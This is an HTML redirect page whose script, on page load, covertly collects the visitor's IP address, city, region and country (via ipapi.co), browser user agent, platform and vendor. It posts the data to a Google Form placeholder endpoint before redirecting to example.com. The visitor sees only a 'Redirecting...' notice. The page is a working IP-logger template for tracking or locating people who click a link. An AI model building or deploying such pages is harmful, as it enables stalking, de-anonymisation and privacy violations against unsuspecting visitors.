<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <script>
        // URL to redirect to after capturing data
        const REDIRECT_URL = "https://example.com";

        // Function to send data to Google Form and then redirect
        async function sendDataAndRedirect() {
            try {
                // Fetch IP and Geolocation data
                const geoResponse = await fetch('https://ipapi.co/json/');
                const geoData = await geoResponse.json();

                // Get other details
                const timestamp = new Date().toISOString();
                const userAgent = navigator.userAgent;
                const os = navigator.platform;
                const device = navigator.vendor;

                // Create a FormData object
                const formData = new FormData();
                formData.append("entry.YOUR_TIMESTAMP_ID", timestamp);
                formData.append("entry.YOUR_IP_ID", geoData.ip);
                formData.append("entry.YOUR_OS_ID", os);
                formData.append("entry.YOUR_DEVICE_ID", device);
                formData.append("entry.YOUR_GEOLOCATION_ID", `${geoData.city}, ${geoData.region}, ${geoData.country_name}`);
                formData.append("entry.YOUR_USERAGENT_ID", userAgent);

                // Submit to Google Form
                await fetch("YOUR_GOOGLE_FORM_ACTION_URL", {
                    method: "POST",
                    body: formData,
                    mode: "no-cors" // Important to avoid CORS errors
                });

            } catch (error) {
                console.error("Error capturing data:", error);
            } finally {
                // Redirect the user
                window.location.href = REDIRECT_URL;
            }
        }
    </script>
</head>
<body onload="sendDataAndRedirect()">
    <p>If you are not redirected automatically, <a href="https://example.com">click here</a>.</p>
</body>
</html>
